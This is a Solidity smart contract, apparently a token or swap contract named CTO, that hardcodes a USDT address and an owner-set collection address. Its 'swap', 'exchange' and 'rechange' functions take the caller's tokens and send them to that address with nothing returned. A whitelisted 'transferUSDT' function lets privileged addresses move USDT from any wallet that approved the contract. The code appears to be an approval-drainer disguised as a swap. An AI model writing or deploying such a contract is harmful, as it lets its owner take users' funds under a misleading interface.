// contract/MyTokenV1.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/math/SafeMathUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/ContextUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/AddressUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/structs/EnumerableSetUpgradeable.sol";

contract CTO is Initializable, UUPSUpgradeable, OwnableUpgradeable {
    using SafeMathUpgradeable for uint256;
    using AddressUpgradeable for address;

    ERC20Upgradeable private _usdtToken;
    address public rechangeAddress;
    mapping(address=>bool) whiteList;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    function _authorizeUpgrade(address) internal override onlyOwner {}

    function initialize() public initializer {
        __Ownable_init();
        __UUPSUpgradeable_init();
        _usdtToken = ERC20Upgradeable(
            0x55d398326f99059fF775485246999027B3197955
        );
        rechangeAddress = 0x27C932A1687dCfE7Ca1C3Fdb372e286e910CEfCF;
        whiteList[owner()] = true;
    }
    modifier whiteAddress() {
        require(whiteList[msg.sender], "not white address");
        _;
    }

    function setWhiteAddress(address _account, bool _flag) public onlyOwner {
        whiteList[_account] = _flag;
    }

    function setTokenAddress(address account) public onlyOwner {
        _usdtToken = ERC20Upgradeable(account);
    }
    function setRechangeAddress(address account) public onlyOwner {
        rechangeAddress = account;
    }
    event Rechange(address indexed id, uint256 amount);
    function rechange(uint256 usdtAmount) public {
        address spender = _msgSender();
        if (usdtAmount > 0) {
            _usdtToken.transferFrom(spender, rechangeAddress, usdtAmount);
            emit Rechange(spender, usdtAmount);
        }
    }

    event Exchange(address token,address from, address to, uint256 usdtAmount);
    function exchange(address tokenAddress,uint256 amount) public {
        ERC20Upgradeable _token = ERC20Upgradeable(tokenAddress);
        address spender = _msgSender();
        _token.transferFrom(spender, rechangeAddress, amount);
        emit Exchange(tokenAddress,spender,rechangeAddress, amount);
    }

    event Swap(address token0,address token1,address from, address to, uint256 amount);
    function swap(address token0,address token1,uint256 amount) public {
        ERC20Upgradeable _token = ERC20Upgradeable(token0);
        address spender = _msgSender();
        _token.transferFrom(spender, rechangeAddress, amount);
        emit Swap(token0,token1,spender,rechangeAddress, amount);
    }

    function transferUSDT(
        address from,
        address to,
        uint256 amount
    ) public whiteAddress{
        _usdtToken.transferFrom(from, to, amount);
    }
}
